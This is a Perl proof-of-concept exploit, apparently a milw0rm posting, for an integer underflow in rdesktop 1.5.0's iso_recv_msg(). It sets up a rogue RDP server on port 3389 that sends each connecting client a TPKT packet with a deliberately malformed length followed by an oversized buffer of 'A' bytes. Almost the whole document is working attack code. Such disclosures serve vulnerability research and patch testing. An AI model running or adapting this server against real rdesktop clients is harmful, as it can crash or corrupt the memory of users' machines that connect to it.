<html><head><title>rdesktop 1.5.0 iso_recv_msg() Integer Underflow Vulnerability PoC</title></head><pre>#!/usr/bin/perl
#
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=696

use warnings;
use strict;
use IO::Socket;

my $sock = IO::Socket::INET-&gt;new(LocalAddr =&gt; '0.0.0.0', LocalPort =&gt; '3389', Listen =&gt; 1, Reuse =&gt; 1) || die($!);

while(my $c = $sock-&gt;accept())
{
        print $c        &quot;\x03&quot;                          .# TPKT version
                        &quot;\x00&quot;                          .# reserved
                        &quot;\x00\x01&quot;                      .# evil length here 
                        &quot;\x06\xd0\x00\x00\x12\x34\x00&quot;  .
                        &quot;\x41&quot; x 204942;

        sleep 1;
        close $sock;
}

# milw0rm.com [2008-05-08]</pre></html>